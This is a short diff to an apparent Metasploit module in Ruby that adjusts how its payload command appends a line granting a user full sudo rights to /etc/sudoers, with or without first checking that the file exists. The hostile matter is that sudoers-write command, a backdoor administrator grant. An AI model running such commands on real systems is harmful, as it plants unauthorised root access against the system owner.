@@ -81,8 +81,9 @@ module MetasploitModule
     if datastore['RootMethod'] == 'SUDO'
       if datastore['CheckSudoers']
         payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+      else
+        payload_cmd += ";echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers"
       end
-      payload_cmd += ";echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers"
     end
     payload_cmd
   end
